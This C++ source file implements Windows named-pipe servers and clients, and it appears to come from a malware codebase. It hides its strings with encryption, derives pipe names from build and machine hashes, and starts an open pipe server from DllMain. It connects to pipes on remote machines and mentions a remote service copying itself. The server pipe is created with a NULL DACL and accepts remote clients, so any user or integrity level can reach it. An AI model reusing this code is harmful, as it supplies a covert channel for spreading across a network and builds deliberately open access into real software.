/*
	PipeWorks.cpp
	Pipe-related functions

	If parent module defines NO_TRANSPORT_ENVELOPE, no support for transport enveloping will be compiled. This is a special mode for RemoteServiceExe project to reduce code size
	Also, this module will be compiled in direct mode, undefining ROUTINES_BY_PTR

*/

#include <windows.h>
#include "dbg.h"
#include "PipeWorks.h"

#ifdef ROUTINES_BY_PTR
#ifndef NO_TRANSPORT_ENVELOPE
#define ROUTINES_BY_PTR_ALLOWED
#endif
#endif

#ifdef ROUTINES_BY_PTR_ALLOWED


PipeWorks_ptrs PipeWorks_apis;	// global var for transparent name translation into call-by-pointer	

// should be called before any other apis used to fill internal structures
VOID PipeWorks_resolve(PipeWorks_ptrs *apis)
{
#ifdef _DEBUG
	if (IsBadReadPtr(apis, sizeof(PipeWorks_ptrs))) { DbgPrint("DBG_ERR: bad read ptr %p len %u", apis, sizeof(PipeWorks_ptrs)); }
#endif
	// save to a global var
	PipeWorks_apis = *apis;
}

#else 

#include "mem.h"
#include "dbg.h"
#include "CryptoStrings.h"
#include "RandomGen.h"
#include "MyStringRoutines.h"
#include "HashedStrings.h"
#include "MyStreams.h"
#include "DataCallbackManager.h"
#include "HashDeriveFuncs.h"

#ifndef NO_TRANSPORT_ENVELOPE
	#pragma message( __FILE__ " :: transport envelope enabled") 
	#include "NetMessageEnvelope.h"
#else
#pragma message( __FILE__ " :: transport envelope DISABLED") 
#endif

#include "..\shared\config.h"

/*
	Fill passed structure with ptrs to all exported functions
	Used when module compiled as code to provide ptrs to some other child code
*/
VOID PipeWorks_imports(PipeWorks_ptrs *apis)
{
	apis->fnpwInitPipeServer = pwInitPipeServer;
	apis->fnpwInitPipeServerAsync = pwInitPipeServerAsync;
	apis->fnpwIsRemotePipeWorkingTimeout = pwIsRemotePipeWorkingTimeout;
	apis->fn_pwRemotePipeCheckSend = _pwRemotePipeCheckSend;

}

// ALL: generates pipe name and stores to internal buffer
// wszTargetMachineName may be NULL to generate name for local machine
VOID _pwGenPipeName(LPWSTR wszTargetBuff, LPWSTR wszTargetMachineName)
{
	LPWSTR wszS;	// decrypt buffer
	RndClass rg = { 0 };	// pseudo-random number generator with constant seed

	// init rnd object
	rgNew(&rg);
	

	// prepare heading according to selection
	if (!wszTargetMachineName) {

		// local machine
		DbgPrint("NOTE: local machine");
		wszS = CRSTRW("\\\\.\\pipe\\", "\xfc\x1f\x54\x02\xf5\x1f\x68\x36\xa2\x3b\xa4\xe3\x1c\xe2\xa8");
		lstrcpy(wszTargetBuff, wszS);
		my_free(wszS);

		// init passing NULL as machine name, api will check hostname internally
		rg.rgInitSeed(&rg, TARGET_BUILDCHAIN_HASH ^ i64CalcTargetMachineHash(wszTargetMachineName));

	} else {

		// remote machine specified by name

		// check if user supplied '\'
		if (*(WCHAR *)wszTargetMachineName != L'\\') {

			DbgPrint("NOTE: caller missed starting backslashes, adding");
			wszS = CRSTRW("\\\\", "\x00\x60\xf1\x0c\x02\x60\xcd\x38\x80\x61\x4c");
			lstrcpy(wszTargetBuff, wszS);
			my_free(wszS);

		} // backslash check

		
		lstrcat(wszTargetBuff, wszTargetMachineName);

		// calc hash from machine name surely with starting backslashes 
		rg.rgInitSeed(&rg, TARGET_BUILDCHAIN_HASH ^ i64CalcTargetMachineHash(wszTargetBuff));

		wszS = CRSTRW("\\pipe\\", "\xfd\x3f\xa5\x05\xfb\x3f\x99\x1d\xe4\x37\x40\xd1\xae\xa7\x67");
		lstrcat(wszTargetBuff, wszS);
		my_free(wszS);

	} // wszTargetMachineName


	// do the gen
	//DbgPrint("pre gen");
	sr_genRandomCharsRG_h(&rg, 16, 32, (LPWSTR)(wszTargetBuff + lstrlen(wszTargetBuff)));
	DbgPrint("res=[%ws]", wszTargetBuff);

}



// SRV: client connection dispatcher thread
DWORD WINAPI thrPipeClientConnectionDispatch(LPVOID lpParameter)
{
	DISPATCHER_THREAD_PARAMS *dtp = (DISPATCHER_THREAD_PARAMS *)lpParameter;		// pipe handle and other params from connection function
	DISPATCHER_CALLBACK_PARAMS cp = { 0 };	// to be prepared and passed to callback
	LPVOID pBufferIn, pBufferOut;	// in, out buffers
	DWORD dwRead;					// amount of data read
	DWORD dwLen;					// buf len, amount of data in buffer
	BOOL fRes;						// read, write result

	BOOL bEnvelopeProcessed = FALSE;	// flag indicating an envelope processing was done

	MY_STREAM ms;		// stream to hold input / output data, which is read from remote by small chunks

	DbgPrint("entered");

	// dbg query username connected
#ifdef _DEBUG
	LPWSTR wszUsername = (LPWSTR)my_alloc(1024);
	if (GetNamedPipeHandleState(dtp->hPipe, NULL, NULL, NULL, NULL, wszUsername, 512)) { DbgPrint("got connection from %ws", wszUsername); } else { DbgPrint("WARN: le %04Xh determining username", GetLastError()); }
	my_free(wszUsername);
#endif

	// alloc buffers
	pBufferIn = my_alloc(PIPE_BUFFER_SIZE);
	pBufferOut = my_alloc(PIPE_BUFFER_SIZE);

	// init stream
	msInitStream(&ms);

	// processing loop until user supply 0 len
	do {
	
		// do read data 
		dwRead = 0;
		fRes = ReadFile(dtp->hPipe, pBufferIn, PIPE_BUFFER_SIZE, &dwRead, NULL);
		
		if (dwRead) { 
			// check if read ok
			DbgPrint("read %u", dwRead);

			// add part to resulting stream buff
			ms.msWriteStream(&ms, pBufferIn, dwRead);

#ifndef NO_TRANSPORT_ENVELOPE

			// when transport envelope is enabled, check on every iteration if we finished reading for entire pack
			// in other case, server will detect send finish only when client ends pipe connection
			cp.lInBufferLen = (DWORD)ms.lDataLen;
			DbgPrint("checking buffer of %u len", cp.lInBufferLen);
			if (nmeCheckRemoveEnvelope(ms.pData, &cp.lInBufferLen, &cp.bInputMessageId)) { DbgPrint("got full envelope, len %u id %u", cp.lInBufferLen, cp.bInputMessageId); bEnvelopeProcessed = TRUE; break; }
#else
			cp.lInBufferLen = (DWORD)ms.lDataLen;
			bEnvelopeProcessed = TRUE;
#endif

		}  // if dwRead

		// check for exit loop
		if ((!fRes) && (GetLastError() != ERROR_MORE_DATA)) { DbgPrint("read finished, possibly with no luck"); break; }
	
	} while (TRUE); // while data to be read present

	if (bEnvelopeProcessed) {

		DbgPrint("done reading multiple chunks indata");

		// prepare params to be passed to callback
		cp.pInBuffer = ms.pData;
		//	cp.lInBufferLen = ms.lDataLen;
		cp.csType = ST_PIPE;

		// enter dispatching routines
		EnterCriticalSection(dtp->csDispatcherCall);
		__try {

			// call dispatcher
			dtp->cdCallback(&cp);

		}
		__except (1) { DbgPrint("ERR: exception while dispatcher call"); }
		LeaveCriticalSection(dtp->csDispatcherCall);

#ifndef NO_TRANSPORT_ENVELOPE

		// check if caller need to send answer
		if (cp.pAnswer && cp.lAnswerLen) {

			DbgPrint("preparing callback answer to be sent, orig len %u", cp.lAnswerLen);

			LPVOID pEnvelope = NULL;
			DWORD dwEnvelopeLen;

			// encode answer
			nmeMakeEnvelope(cp.pAnswer, cp.lAnswerLen, cp.bAnswerMessageId, &pEnvelope, &dwEnvelopeLen);

			// reinit stream
			ms.msFreeStream(&ms);
			msInitStream(&ms);
			ms.msWriteStream(&ms, pEnvelope, dwEnvelopeLen);

			// free mem used
			if (pEnvelope) { my_free(pEnvelope); }

			// free answer from callback
			my_free(cp.pAnswer);

			DbgPrint("total len to sent %u bytes", dwEnvelopeLen);

			// alloc tmp buffer for chunks
			LPVOID pChunk = my_alloc(PIPE_BUFFER_SIZE);
			DWORD lChunkLen, dwBytes;
			BOOL bWritten;

			// do write
			do {

				// get chunk from stream
				if (lChunkLen = (DWORD)ms.msReadStream(&ms, pChunk, PIPE_BUFFER_SIZE)) {

					// try to write to pipe
					dwBytes = 0;
					bWritten = WriteFile(dtp->hPipe, pChunk, lChunkLen, &dwBytes, NULL);

					// check for send error -> exit loop
					if ((!bWritten) || (dwBytes != lChunkLen)) { DbgPrint("send failure: res %u, le %u, written %u of %u", bWritten, GetLastError(), dwBytes, lChunkLen); break; }

				}

			} while (lChunkLen && bWritten);

			// free used resources
			if (pChunk) { my_free(pChunk); }

			DbgPrint("done sending answer");

		}
		else { DbgPrint("callback has nothing to answer"); }

#endif

	} else { DbgPrint("WARN: nothing received to be sent to callback, closing connection"); }

	// Flush the pipe to allow the client to read the pipe's contents 
	// before disconnecting. Then disconnect the pipe, and close the 
	// handle to this pipe instance. 
	FlushFileBuffers(dtp->hPipe);
	DisconnectNamedPipe(dtp->hPipe);
	CloseHandle(dtp->hPipe);

	// free stream
	ms.msFreeStream(&ms);

	// free internal buffers
	my_free(pBufferIn);
	my_free(pBufferOut);

	// free buffers passed
	my_free(dtp);

	ExitThread(0);
}


/*
	Prepares SECURITY_ATTRIBUTES to allow access from any user/level to the object
	Failing to use this function will make object unaccessible (ERROR_ACCESS_DENIED)
	from lower user privileges or integrity levels
*/
VOID _pwMakeEveryoneDACL(SECURITY_ATTRIBUTES *sa)
{
	OSVERSIONINFO osvi = { 0 };

	DbgPrint("entered");

	sa->nLength = sizeof(SECURITY_ATTRIBUTES);
	sa->lpSecurityDescriptor = my_alloc(SECURITY_DESCRIPTOR_MIN_LENGTH);
	sa->bInheritHandle = TRUE;

	DbgPrint("sa inited, calling InitializeSecurityDescriptor()");

	if (!InitializeSecurityDescriptor(sa->lpSecurityDescriptor, SECURITY_DESCRIPTOR_REVISION)) { DbgPrint("WARN: failed InitializeSecurityDescriptor() with code %04Xh", GetLastError()); }

	DbgPrint("calling SetSecurityDescriptorDacl()");
	if (!SetSecurityDescriptorDacl(sa->lpSecurityDescriptor, TRUE, NULL, FALSE)) { DbgPrint("WARN: failed SetSecurityDescriptorDacl() with code %04Xh", GetLastError()); }

	// NB: GetVersionEx() possibly fails in x64 server if running as service
	// if >= Vista, perform special measures to avoid integrity levels problem
	DbgPrint("about to call GetVersionEx");
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	if (!GetVersionEx(&osvi)) { DbgPrint("WARN: le %04Xh calling GetVersionEx()", GetLastError()); return; }
	if (osvi.dwMajorVersion >= 6)	{

		// http://blogs.technet.com/b/nettracer/archive/2010/07/23/why-does-anonymous-pipe-access-fail-on-windows-vista-2008-windows-7-or-windows-2008-r2.aspx
		// http://blog.m-ri.de/index.php/2009/12/08/windows-integrity-control-schreibzugriff-auf-eine-named-pipe-eines-services-ueber-anonymen-zugriff-auf-vista-windows-2008-server-und-windows-7/
		DbgPrint("NOTE: extra SACL modification to bypass integrity levels check (TODO!!!!)");

		// Now the trick with the SACL:
		// We set SECURITY_MANDATORY_UNTRUSTED_RID to SYSTEM_MANDATORY_POLICY_NO_WRITE_UP
		// Anonymous access is untrusted, and this process runs equal or above medium
		// integrity level. Setting "S:(ML;;NW;;;LW)" is not sufficient.
		//_tcscat(szBuff, _T("S:(ML;;NW;;;S-1-16-0)"));

	} // if >= Vista

	DbgPrint("done");
}



// SRV: init function to generate and open named pipe for accepting connections
DWORD WINAPI pwInitPipeServer(LPVOID pParameter)
{
	CLIENTDISPATCHERFUNC cdCallback = (CLIENTDISPATCHERFUNC)pParameter;	// callback function to be called on each ready data chunk
	LPWSTR wszPipeName;		// pipe name
	BOOL fConnected;		// is client connected flag
	HANDLE hThread;			// dispatcher thread (renewed)
	HANDLE hPipe;
	DWORD dwThreadId;

	CRITICAL_SECTION *cs;
	DISPATCHER_THREAD_PARAMS *dtp;	// params to pass to every dispatcher thread
	SECURITY_ATTRIBUTES sa;

	DbgPrint("entered");

	// init params
	cs = (CRITICAL_SECTION *)my_alloc(sizeof(CRITICAL_SECTION));
	InitializeCriticalSection(cs);

	// gen pipe name into newly allocated buffer
	wszPipeName = (LPWSTR)my_alloc(1024);

	//DbgPrint("generating pipe name");
	_pwGenPipeName(wszPipeName, NULL);
	DbgPrint("server pipe name [%ws]", wszPipeName);

	_pwMakeEveryoneDACL(&sa);

	for (;;) {

		DbgPrint("creating pipe server socket");

		hPipe = CreateNamedPipe(
			wszPipeName,
			PIPE_ACCESS_DUPLEX | FILE_FLAG_WRITE_THROUGH,
			PIPE_TYPE_MESSAGE | PIPE_WAIT | PIPE_ACCEPT_REMOTE_CLIENTS,	
			PIPE_UNLIMITED_INSTANCES,
			10240,
			10240,
			0,
			&sa);

		// check result
		if (hPipe == INVALID_HANDLE_VALUE) { DbgPrint("ERR: CreateNamedPipe() failed, le %04Xh", GetLastError()); return 0; }

		// prevent from inheritance in child processes (looks like ShellExecuteEx() inherits handles without possibility to disable via params)
		if (!SetHandleInformation(hPipe, HANDLE_FLAG_INHERIT, 0)) { DbgPrint("ERR: failed to set not inheritable flag, le %p", GetLastError()); }

		// wait for client connection 
		fConnected = ConnectNamedPipe(hPipe, NULL) ? TRUE : (GetLastError() == ERROR_PIPE_CONNECTED);

		// check if connection was ok
		if (fConnected) {

			// alloc params buffer, to be freed by caller
			dtp = (DISPATCHER_THREAD_PARAMS *)my_alloc(sizeof(DISPATCHER_THREAD_PARAMS));
			dtp->csDispatcherCall = cs;
			dtp->hPipe = hPipe;
			dtp->cdCallback = cdCallback;

			// create dispatcher thread
			hThread = CreateThread(NULL, 0, thrPipeClientConnectionDispatch, (LPVOID)dtp, 0, &dwThreadId);
			if (hThread) { CloseHandle(hThread); } else { DbgPrint("ERR: failed to create dispatcher thread, le %04Xh", GetLastError()); }

		} else {
			DbgPrint("some error while client connection");
			CloseHandle(hPipe);
		}

		DbgPrint("looping");

	} // infinite for

	// free mem used
	my_free(wszPipeName);

	return 0;
}


// SRV: to be called from DllMain or other entry point - creates a thread to execute pwInitPipeServer()
void pwInitPipeServerAsync(CLIENTDISPATCHERFUNC cdCallback)
{
	HANDLE hThread;
	DWORD dwThreadId;

	hThread = CreateThread(NULL, 0, pwInitPipeServer, (LPVOID)cdCallback, 0, &dwThreadId);
	if (hThread) { CloseHandle(hThread); } else { DbgPrint("ERR: failed to create init thread, le %04Xh", GetLastError()); }

}


/* CLN: misc 
 pwIsRemotePipeWorkingTimeout() mode [wszTargetMachineName+dwTimeoutMsec+dwRecheckIntervalMsec]: check if remote pipe is opened and connectable on specified machine
 if dwTimeoutSec specified, do re-checks in 1-2 sec until dwTimeoutSec elapsed
 if dwTimeoutSec is 0, check once and return answer immediatly
 dwRecheckIntervalMsec specify how long to wait after each check attempt, may be 0 
	pAnswer & dwAnswerLen may be NULL if caller doesnt need answer
	*pbPipeMessageId used to specify and receive id of message via envelope, if envelope support is not disabled

  NB: in order to send NOT enveloped data (for ex, for rse to start a copy from a envelope-enabled code), 
  specify NULL for pAnswer, pdwAnswerLen, pbPipeMessageId

  Specifying NULL for pSendData & lSendDataLen will lead to pipe check only, without actual connection
*/
BOOL _pwRemotePipeCheckSend(LPWSTR wszTargetMachineName, DWORD dwTimeoutMsec, DWORD dwRecheckIntervalMsec, LPVOID pSendData, DWORD lSendDataLen, LPVOID *pAnswer, DWORD *pdwAnswerLen, BYTE *pbPipeMessageId)
{
	BOOL bRes = FALSE;	// function result
	LPWSTR wszPipeName;
	HANDLE hRemotePipe;
	DWORD dwBytes = 0;	// WriteFile() / ReadFile() result
	BOOL bWritten;
	DWORD dwMaxTicks = GetTickCount() + dwTimeoutMsec;	// ticks count when need to exit

	MY_STREAM ms;	// stream used to split data for send
	LPVOID pChunk;	// buffer to hold single data chunk to be sent
	DWORD lChunkLen;	// len of chunk ^

	//DbgPrint("entered");

	// gen pipe name into newly allocated buffer
	wszPipeName = (LPWSTR)my_alloc(1024);

	_pwGenPipeName(wszPipeName, wszTargetMachineName);
	//DbgPrint("pipe name [%ws]", wszPipeName);

	do {

		// check if pipe exists without actual connection
		bRes = WaitNamedPipe(wszPipeName, 0);
		if (!bRes) { DbgPrint("le %04Xh", GetLastError()); }

		// wait a bit if no connection detected
		if (!bRes) { Sleep(dwRecheckIntervalMsec); }

	} while ((!bRes) && (GetTickCount() < dwMaxTicks));
	
	// attempt to connect, if caller specified buffer to be sent
	if ((pSendData) && (lSendDataLen)) {

		DbgPrint("caller specified buffer to be sent, connecting to pipe")

		hRemotePipe = CreateFile(wszPipeName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hRemotePipe != INVALID_HANDLE_VALUE) { 
			
			DbgPrint("connected ok"); 

			if (!SetHandleInformation(hRemotePipe, HANDLE_FLAG_INHERIT, 0)) { DbgPrint("ERR: failed to set not inheritable flag, le %p", GetLastError()); }

			// prepare output stream to send data in small chunks (<=PIPE_BUFFER_SIZE)
			msInitStream(&ms);
			ms.msWriteStream(&ms, pSendData, lSendDataLen);

			
#ifndef NO_TRANSPORT_ENVELOPE

			// check if enveloping not disabled
			if (pAnswer || pdwAnswerLen || pbPipeMessageId) {

				// if specified, prepare envelope. Use value at *pbPipeMessageId
				LPVOID pEnveloped = NULL;
				DWORD dwEnvelopedLen;
				BYTE bMsgId = 0;

				if (pbPipeMessageId) { bMsgId = *pbPipeMessageId; }
				nmeMakeEnvelope(ms.pData, ms.lDataLen, bMsgId, &pEnveloped, &dwEnvelopedLen);

				DbgPrint("data enveloped, size increased from %u to %u", ms.lDataLen, dwEnvelopedLen);

				// reinit stream with enveloped data
				ms.lDataLen = 0; 
				ms.msWriteStream(&ms, pEnveloped, dwEnvelopedLen);

				// free used buffer
				if (pEnveloped) { my_free(pEnveloped); }

			} else { DbgPrint("NOTE: caller specified to disable enveloping"); }
#endif

			// alloc tmp buffer for chunks
			pChunk = my_alloc(PIPE_BUFFER_SIZE);
			
			// do write
			do {

				// get chunk from stream
				if (lChunkLen = (DWORD)ms.msReadStream(&ms, pChunk, PIPE_BUFFER_SIZE)) {

					// try to write to pipe
					dwBytes = 0;
					bWritten = WriteFile(hRemotePipe, pChunk, lChunkLen, &dwBytes, NULL);
					DbgPrint("written %u, left %u", dwBytes, ms.lDataLen);

					// check for send error -> exit loop
					if ((!bWritten) || (dwBytes != lChunkLen)) { DbgPrint("send failure: res %u, le %u, written %u of %u", bWritten, GetLastError(), dwBytes, lChunkLen); break; }

				} else {
				
					// nothing to get from stream, all sent ok
					bRes = TRUE;
					break;

				} // chunk got

			} while (lChunkLen && bWritten);



			// free stream
			ms.msFreeStream(&ms);

			// ensure remote side receive all contents
			FlushFileBuffers(hRemotePipe);

#ifndef NO_TRANSPORT_ENVELOPE

			// check if caller need answer
			if (pAnswer && pdwAnswerLen) {

				DbgPrint("caller need answer, reading...");

				// re-init disposed stream
				msInitStream(&ms);

				BOOL fRes;
				
				do { // infinite loop

					dwBytes = 0;
					fRes = ReadFile(hRemotePipe, pChunk, PIPE_BUFFER_SIZE, &dwBytes, NULL);

					if (dwBytes) {

						DbgPrint("got %u bytes", dwBytes);
						ms.msWriteStream(&ms, pChunk, dwBytes);

						*pdwAnswerLen = ms.lDataLen;

						if (nmeCheckRemoveEnvelope(ms.pData, pdwAnswerLen, pbPipeMessageId)) { DbgPrint("got full envelope, len %u id %u", *pdwAnswerLen, *pbPipeMessageId); break; }

					} // if dwBytes

					if ((!fRes) && (GetLastError() != ERROR_MORE_DATA)) { DbgPrint("read finished"); break; }

				} while (TRUE);	// infinite loop


				// alloc a new buffer to copy data there
				if (*pAnswer = my_alloc(*pdwAnswerLen)) {
					memcpy(*pAnswer, ms.pData, *pdwAnswerLen);
				}

				// free used buffer
				ms.msFreeStream(&ms);

			} else { DbgPrint("caller specified no answer needed"); }

#endif

			// free mem used
			my_free(pChunk);



			// close connection
			DisconnectNamedPipe(hRemotePipe);	// is this really needed for client?
			CloseHandle(hRemotePipe);

		} else { DbgPrint("connection failed, le %04Xh", GetLastError()); bRes = FALSE; }

	} // if pSendData && lSendDataLen

	// free mem used
	my_free(wszPipeName);

	return bRes;

}


BOOL pwIsRemotePipeWorkingTimeout(LPWSTR wszTargetMachineName, DWORD dwTimeoutMsec, DWORD dwRecheckIntervalMsec)
{
	return _pwRemotePipeCheckSend(wszTargetMachineName, dwTimeoutMsec, dwRecheckIntervalMsec, NULL, 0, NULL, NULL, NULL);
}

#endif